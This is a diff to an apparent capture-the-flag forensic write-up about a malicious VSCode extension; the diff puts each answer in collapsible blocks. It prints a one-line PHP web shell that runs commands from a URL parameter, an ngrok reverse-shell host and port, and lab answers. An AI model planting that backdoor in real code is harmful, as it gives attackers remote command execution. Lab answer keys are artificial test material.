@@ -38,9 +38,10 @@ So we could check for network connection with `vol3 -f memdump.dmp windows.netst
 
 This IP address is belonged to Amazon and was abused by NJ RAT according to Crowdsourced, by now we could concluded that the application that started the suspicious chain of processes is VSCode (`Code.exe`) and the full path of the suspicious executable being run during the infection chain (Task 8) is `C:\Users\Public\RuntimeBroker.exe`.
 
-```
-Code.exe
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>Code.exe</code></pre>
+</details>
 
 >Task 2: Provide the full path of the malicious file used to gain initial access.
 
@@ -82,19 +83,24 @@ After reviewing the code, we can see that on the line 64 after user proceeded wi
 
 After deobfuscated the code with https://obf-io.deobfuscate.io/, then we can see that this code will create a lockfile (so it could only one instance running at the same time, just like mutex) and it also create connection to `6.tcp.eu.ngrok.io` on port 16587 (task 4) but its appear that this is not the same port as we found from `RuntimeBroker.exe` process so we might have to dump it analyze later.
 
-```
-C:\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>C:\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js</code></pre>
+</details>
 
 >Task 3: What user input, when executed, will run the malicious code?
-```
-help
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>help</code></pre>
+</details>
 
 >Task 4: What are the hostname and port used to establish a reverse shell?
-```
-6.tcp.eu.ngrok.io:16587
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>6.tcp.eu.ngrok.io:16587</code></pre>
+</details>
 
 >Task 5: What is the display name of the developer who created this malicious file?
 
@@ -106,9 +112,10 @@ Most VSCode extensions are source from VS Code Marketplace which is Microsoft's 
 
 And we can also see that the author of this extension on [VS Code Market place](https://marketplace.visualstudio.com/items?itemName=0xS1rx58D3V.ChatGPT-B0T) matches the name we found from filescan output and also matches the author of this sherlock.
 
-```
-0xS1rx58.D3V
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>0xS1rx58.D3V</code></pre>
+</details>
 
 >Task 6: What time was the malicious file released? (UTC).
 
@@ -116,9 +123,10 @@ And we can also see that the author of this extension on [VS Code Market place](
 
 We can get the release date of this extension from the VS Code Marketplace but be aware that this timestamp is based on your timezone so we need to convert to UTC before submitting the answer
 
-```
-2024-07-23 00:41:19
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>2024-07-23 00:41:19</code></pre>
+</details>
 
 >Task 7: Provide the SID for the user who has been compromised.
 
@@ -126,14 +134,17 @@ We can get the release date of this extension from the VS Code Marketplace but b
 
 I used `vol3 -f memdump.dmp windows.getsids | grep User2` to print SID owning each process that belonged to User2 user.
 
-```
-S-1-5-21-1998887770-13753423-1649717590-1001
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>S-1-5-21-1998887770-13753423-1649717590-1001</code></pre>
+</details>
 
 >Task 8: Provide the full path of the suspicious executable being run during the infection chain.
-```
-C:\Users\Public\RuntimeBroker.exe
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>C:\Users\Public\RuntimeBroker.exe</code></pre>
+</details>
 
 >Task 9: The threat actor has modified the Windows registry to include a new entry. This change ensures that whenever a legitimate component runs, it triggers the malicious process, allowing the threat actor to maintain control of the system. Specify the name of the legitimate component.
 
@@ -150,9 +161,10 @@ author of this sherlock and look at the registry key then we can see that this m
 
 If we look up for this [CLSID](https://github.com/jkerai1/CLSID-Lookup/blob/main/CLSID_no_duplicate_records.txt) then we will find that this CLSID belongs to Recycle Bin.
 
-```
-Recycle Bin
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>Recycle Bin</code></pre>
+</details>
 
 - You can read more about CLSID and COM from fellow Medium blog here : https://medium.com/stolabs/a-brief-introduction-about-clsid-and-a-bypass-found-c11be972a38b
 
@@ -162,9 +174,10 @@ Recycle Bin
 
 An action from previous task is [COM Hijacking technique](https://attack.mitre.org/techniques/T1546/015/).
 
-```
-T1546.015
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>T1546.015</code></pre>
+</details>
 
 >Task 11: The threat actor has identified the location for all projects and manipulated one of the project files. Could you provide details about the malicious code that was added by the threat actor?
 
@@ -180,9 +193,10 @@ I exported `Project` folder from disk image (you can mount) then I used `grep -r
 
 This line introduces code execution on the system that running this website so this might be another backdoor added by the attacker to still have a way to get back into this system.
 
-```
-$testc = $_GET['s1']; echo `$testc`;
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>$testc = $_GET['s1']; echo `$testc`;</code></pre>
+</details>
 
 And now we solved the lab
 ![ec2f96071bdf5d294aad8e2435ab3f31.png](/resources/ec2f96071bdf5d294aad8e2435ab3f31.png)
